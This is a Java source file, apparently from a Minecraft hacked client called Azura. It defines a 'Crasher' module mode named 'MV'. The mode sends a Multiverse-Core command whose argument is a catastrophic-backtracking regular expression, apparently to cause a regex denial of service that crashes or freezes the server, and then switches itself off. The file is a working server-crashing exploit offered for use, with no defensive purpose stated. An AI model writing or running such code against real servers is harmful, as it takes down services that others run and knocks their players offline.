package best.azura.client.impl.module.impl.other.crasher;

import best.azura.client.impl.Client;
import best.azura.client.impl.events.EventReceivedPacket;
import best.azura.client.impl.events.EventUpdate;
import best.azura.client.impl.module.impl.other.Crasher;
import best.azura.eventbus.handler.EventHandler;
import best.azura.eventbus.handler.Listener;
import best.azura.client.impl.events.EventSentPacket;
import best.azura.client.api.module.ModeImpl;
import best.azura.client.impl.module.impl.other.Disabler;
import best.azura.client.impl.value.BooleanValue;
import best.azura.client.api.value.Value;
import best.azura.scripting.AzuraScript;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C0FPacketConfirmTransaction;
import net.minecraft.network.play.client.C12PacketUpdateSign;
import net.minecraft.util.BlockPos;

import java.util.Arrays;
import java.util.List;

public class MVCrasher implements ModeImpl<Crasher> {

    @Override
    public Crasher getParent() {
        return (Crasher) Client.INSTANCE.getModuleManager().getModule(Crasher.class);
    }

    @Override
    public String getName() {
        return "MV";
    }

    @Override
    public void onEnable() {

    }

    @Override
    public void onDisable() {

    }

    @EventHandler
    public final Listener<EventReceivedPacket> eventUpdateListener = e -> {
        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(new C01PacketChatMessage("/multiverse-core:mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.++)$^\\n"));
        Client.INSTANCE.getModuleManager().getModule("Crasher").setEnabled(false);
    };

}